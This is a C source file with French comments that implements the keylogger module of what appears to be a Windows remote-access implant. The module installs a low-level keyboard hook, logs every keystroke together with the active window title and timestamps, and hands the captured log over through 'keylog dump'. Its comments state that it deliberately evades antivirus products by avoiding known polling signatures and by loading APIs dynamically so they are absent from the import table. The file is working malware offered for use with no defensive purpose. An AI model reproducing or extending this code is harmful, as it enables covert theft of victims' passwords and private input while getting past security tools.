#include "keylog.h"
#include <stdio.h>
#include <string.h>
#include <time.h>

/**
 * Module Keylogger - Implémentation via SetWindowsHookEx (WH_KEYBOARD_LL)
 *
 * Pourquoi ce choix :
 * - GetAsyncKeyState() en boucle = signature AV bien connue (IOC évident)
 * - WH_KEYBOARD_LL = hook event-driven, utilisé par de nombreuses apps légitimes
 *   (gestionnaires de raccourcis, outils d'accessibilité, etc.)
 * - Les API sont chargées dynamiquement via GetProcAddress pour ne pas apparaître
 *   dans la table d'imports du binaire (analyse statique)
 *
 * Architecture :
 *   Thread dédié → installe le hook → tourne une message loop Windows
 *   Le callback KeyboardProc est appelé par Windows à chaque frappe
 *   keylog_stop() envoie WM_QUIT au thread pour sortir proprement
 */

// ─── État global ─────────────────────────────────────────────────────────────

static HANDLE          g_keylog_thread  = NULL;
static volatile BOOL   g_keylog_running = FALSE;
static HANDLE          g_keylog_mutex   = NULL;
static HHOOK           g_hook           = NULL;
static DWORD           g_hook_thread_id = 0;

// Buffer de capture
static char   g_keylog_buffer[KEYLOG_BUFFER_SIZE];
static size_t g_keylog_buffer_pos = 0;
static char   g_last_window[256]  = {0};

// ─── Pointeurs de fonctions (chargement dynamique) ───────────────────────────

typedef HHOOK   (WINAPI *fn_SetWindowsHookExA_t)(int, HOOKPROC, HINSTANCE, DWORD);
typedef BOOL    (WINAPI *fn_UnhookWindowsHookEx_t)(HHOOK);
typedef LRESULT (WINAPI *fn_CallNextHookEx_t)(HHOOK, int, WPARAM, LPARAM);

static fn_SetWindowsHookExA_t   p_SetWindowsHookEx   = NULL;
static fn_UnhookWindowsHookEx_t p_UnhookWindowsHookEx = NULL;
static fn_CallNextHookEx_t      p_CallNextHookEx      = NULL;

// ─── Helpers ─────────────────────────────────────────────────────────────────

static void keylog_append(const char *text) {
    if (!g_keylog_mutex) return;
    WaitForSingleObject(g_keylog_mutex, INFINITE);
    size_t len = strlen(text);
    if (g_keylog_buffer_pos + len < KEYLOG_BUFFER_SIZE - 1) {
        memcpy(g_keylog_buffer + g_keylog_buffer_pos, text, len);
        g_keylog_buffer_pos += len;
        g_keylog_buffer[g_keylog_buffer_pos] = '\0';
    }
    ReleaseMutex(g_keylog_mutex);
}

static void check_window_context(void) {
    char title[256] = {0};
    HWND hwnd = GetForegroundWindow();
    if (hwnd) GetWindowTextA(hwnd, title, sizeof(title) - 1);

    if (strlen(title) > 0 && strcmp(title, g_last_window) != 0) {
        strncpy(g_last_window, title, sizeof(g_last_window) - 1);
        char context[512];
        time_t now = time(NULL);
        struct tm *tm_info = localtime(&now);
        char ts[16];
        strftime(ts, sizeof(ts), "%H:%M:%S", tm_info);
        snprintf(context, sizeof(context), "\n[%s | %s]\n", ts, title);
        keylog_append(context);
    }
}

static const char* translate_vk(DWORD vk) {
    switch (vk) {
        case VK_RETURN:                      return "[ENTER]\n";
        case VK_BACK:                        return "[BACK]";
        case VK_TAB:                         return "[TAB]";
        case VK_CAPITAL:                     return "[CAPS]";
        case VK_ESCAPE:                      return "[ESC]";
        case VK_SPACE:                       return " ";
        case VK_DELETE:                      return "[DEL]";
        case VK_LWIN: case VK_RWIN:          return "[WIN]";
        case VK_LEFT:                        return "[<-]";
        case VK_RIGHT:                       return "[->]";
        case VK_UP:                          return "[^]";
        case VK_DOWN:                        return "[v]";
        case VK_PRIOR:                       return "[PgUp]";
        case VK_NEXT:                        return "[PgDn]";
        case VK_HOME:                        return "[Home]";
        case VK_END:                         return "[End]";
        // Modificateurs : ignorés (état capturé via GetKeyboardState)
        case VK_SHIFT: case VK_LSHIFT:
        case VK_RSHIFT: case VK_CONTROL:
        case VK_LCONTROL: case VK_RCONTROL:
        case VK_MENU: case VK_LMENU:
        case VK_RMENU:                       return "";
        default:                             return NULL;
    }
}

// ─── Callback du hook ────────────────────────────────────────────────────────

/**
 * Appelé par Windows à chaque événement clavier (event-driven, pas de polling)
 * Doit appeler CallNextHookEx pour ne pas bloquer la chaîne de hooks
 */
static LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;

        check_window_context();

        const char *special = translate_vk(kbd->vkCode);
        if (special != NULL) {
            if (special[0] != '\0') keylog_append(special);
        } else {
            // Convertir le VK en caractère Unicode puis UTF-8
            BYTE ks[256] = {0};
            GetKeyboardState(ks);
            WCHAR wide[4] = {0};
            int n = ToUnicode(kbd->vkCode, kbd->scanCode, ks, wide, 3, 0);
            if (n == 1) {
                char utf8[8] = {0};
                WideCharToMultiByte(CP_UTF8, 0, wide, 1, utf8, sizeof(utf8) - 1, NULL, NULL);
                keylog_append(utf8);
            }
        }
    }
    return p_CallNextHookEx(g_hook, nCode, wParam, lParam);
}

// ─── Thread principal du hook ─────────────────────────────────────────────────

static BOOL load_apis(void) {
    // user32.dll est toujours chargé - GetModuleHandle évite un LoadLibrary suspect
    HMODULE u32 = GetModuleHandleA("user32.dll");
    if (!u32) return FALSE;

    p_SetWindowsHookEx   = (fn_SetWindowsHookExA_t)  GetProcAddress(u32, "SetWindowsHookExA");
    p_UnhookWindowsHookEx = (fn_UnhookWindowsHookEx_t)GetProcAddress(u32, "UnhookWindowsHookEx");
    p_CallNextHookEx      = (fn_CallNextHookEx_t)     GetProcAddress(u32, "CallNextHookEx");

    return p_SetWindowsHookEx && p_UnhookWindowsHookEx && p_CallNextHookEx;
}

static DWORD WINAPI keylog_thread_func(LPVOID param) {
    (void)param;

    g_hook_thread_id = GetCurrentThreadId();

    if (!load_apis()) {
        g_keylog_running = FALSE;
        return 1;
    }

    // WH_KEYBOARD_LL : hook global, hMod = NULL (requis pour les low-level hooks)
    g_hook = p_SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!g_hook) {
        g_keylog_running = FALSE;
        return 1;
    }

    // Timestamp de démarrage
    time_t t = time(NULL);
    char ts[64];
    strftime(ts, sizeof(ts), "[Started: %Y-%m-%d %H:%M:%S]\n", localtime(&t));
    keylog_append(ts);

    // Message loop — indispensable pour WH_KEYBOARD_LL
    // Windows appelle KeyboardProc depuis ce contexte via la message queue
    // WM_QUIT (envoyé par keylog_stop) fait sortir GetMessage
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Nettoyage
    p_UnhookWindowsHookEx(g_hook);
    g_hook = NULL;

    t = time(NULL);
    strftime(ts, sizeof(ts), "[Stopped: %Y-%m-%d %H:%M:%S]\n", localtime(&t));
    keylog_append(ts);

    g_keylog_running = FALSE;
    return 0;
}

// ─── API publique ─────────────────────────────────────────────────────────────

int keylog_start(char *output, size_t size) {
    output[0] = '\0';

    if (g_keylog_running) {
        snprintf(output, size, "[-] Keylogger already running\n");
        return KEYLOG_ERROR_ALREADY_RUNNING;
    }

    if (!g_keylog_mutex) {
        g_keylog_mutex = CreateMutex(NULL, FALSE, NULL);
        if (!g_keylog_mutex) {
            snprintf(output, size, "[-] Failed to create mutex\n");
            return KEYLOG_ERROR_THREAD;
        }
    }

    // Réinitialiser l'état
    g_hook_thread_id = 0;
    g_keylog_running = TRUE;

    g_keylog_thread = CreateThread(NULL, 0, keylog_thread_func, NULL, 0, NULL);
    if (!g_keylog_thread) {
        g_keylog_running = FALSE;
        snprintf(output, size, "[-] Failed to create keylog thread\n");
        return KEYLOG_ERROR_THREAD;
    }

    // Attendre que le thread installe le hook (~100ms suffisent)
    Sleep(150);

    if (!g_keylog_running) {
        snprintf(output, size, "[-] Failed to install keyboard hook (need desktop session)\n");
        return KEYLOG_ERROR_THREAD;
    }

    snprintf(output, size,
             "[+] Keylogger started (WH_KEYBOARD_LL)\n"
             "[*] Capturing keystrokes in background\n"
             "[*] Use 'keylog dump' to retrieve logs\n"
             "[*] Use 'keylog stop' to terminate");

    return KEYLOG_SUCCESS;
}

int keylog_stop(char *output, size_t size) {
    output[0] = '\0';

    if (!g_keylog_running) {
        snprintf(output, size, "[-] Keylogger not running\n");
        return KEYLOG_ERROR_NOT_RUNNING;
    }

    g_keylog_running = FALSE;

    // Signaler la message loop de sortir via WM_QUIT
    if (g_hook_thread_id) {
        PostThreadMessageA(g_hook_thread_id, WM_QUIT, 0, 0);
    }

    if (g_keylog_thread) {
        WaitForSingleObject(g_keylog_thread, 3000);
        CloseHandle(g_keylog_thread);
        g_keylog_thread = NULL;
    }

    snprintf(output, size,
             "[+] Keylogger stopped\n"
             "[*] %zu bytes captured\n"
             "[*] Use 'keylog dump' to retrieve logs",
             g_keylog_buffer_pos);

    return KEYLOG_SUCCESS;
}

int keylog_dump(char *output, size_t size) {
    output[0] = '\0';

    if (!g_keylog_mutex) {
        snprintf(output, size, "[*] No keystrokes captured yet\n");
        return KEYLOG_SUCCESS;
    }

    WaitForSingleObject(g_keylog_mutex, INFINITE);

    if (g_keylog_buffer_pos == 0) {
        snprintf(output, size, "[*] No keystrokes captured yet\n");
        ReleaseMutex(g_keylog_mutex);
        return KEYLOG_SUCCESS;
    }

    size_t to_copy = g_keylog_buffer_pos;
    if (to_copy >= size - 128) to_copy = size - 128;

    snprintf(output, size,
             "[Keylog Dump - %zu bytes]\n"
             "═══════════════════════════════════\n"
             "%.*s\n"
             "═══════════════════════════════════\n",
             g_keylog_buffer_pos,
             (int)to_copy,
             g_keylog_buffer);

    // Vider après lecture
    memset(g_keylog_buffer, 0, g_keylog_buffer_pos);
    g_keylog_buffer_pos = 0;

    ReleaseMutex(g_keylog_mutex);
    return KEYLOG_SUCCESS;
}

int keylog_status(char *output, size_t size) {
    output[0] = '\0';

    if (!g_keylog_mutex) {
        snprintf(output, size, "[*] Keylogger Status: STOPPED\n[*] Buffer: 0 bytes\n");
        return KEYLOG_SUCCESS;
    }

    WaitForSingleObject(g_keylog_mutex, INFINITE);

    if (g_keylog_running) {
        snprintf(output, size,
                 "[*] Keylogger Status: ACTIVE (WH_KEYBOARD_LL)\n"
                 "[*] Buffer: %zu / %d bytes (%.1f%%)\n"
                 "[*] Last window: %s\n",
                 g_keylog_buffer_pos,
                 KEYLOG_BUFFER_SIZE,
                 (float)g_keylog_buffer_pos / KEYLOG_BUFFER_SIZE * 100.0f,
                 strlen(g_last_window) > 0 ? g_last_window : "[None]");
    } else {
        snprintf(output, size,
                 "[*] Keylogger Status: STOPPED\n"
                 "[*] Buffer: %zu bytes (non vidé)\n",
                 g_keylog_buffer_pos);
    }

    ReleaseMutex(g_keylog_mutex);
    return KEYLOG_SUCCESS;
}
